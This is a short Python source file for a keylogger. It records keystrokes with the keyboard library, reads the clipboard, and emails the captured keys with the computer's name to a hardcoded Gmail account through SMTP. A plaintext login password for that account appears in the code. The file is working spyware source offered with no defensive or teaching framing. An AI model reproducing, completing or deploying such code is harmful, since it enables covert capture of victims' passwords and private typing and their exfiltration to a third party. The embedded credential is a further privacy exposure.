import pyperclip
import smtplib
import keyboard
import os
import time
import threading

def key_record():

	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()

	server.login("jacksonsoftwaresolutions", "Bt(c@245")

	while True:

		recorded = keyboard.record(until='shift+s+a+9')
		words=[]
		for item in recorded:
			q= type(item)
			print(dir(q))
			if item.name == 'backspace':
				item.name='/'
			if item.name == 'space':
				item.name=' '
			words.append( item.name)
		server.sendmail("jacksonsoftwaresolutions@gmail.com","jacksonsoftwaresolutions@gmail.com", os.environ['COMPUTERNAME']+''.join(words))

	server.close()

def send_timer():

	while True:
		time.sleep(3600*24)
		keyboard.press_and_release('shift+s+a+9')

def main():

	key_record()

	t1 = threading.Thread(target=key_record)
	t2 = threading.Thread(target=send_timer)

	t1.start()
	#t2.start()

if __name__=="__main__":
	main()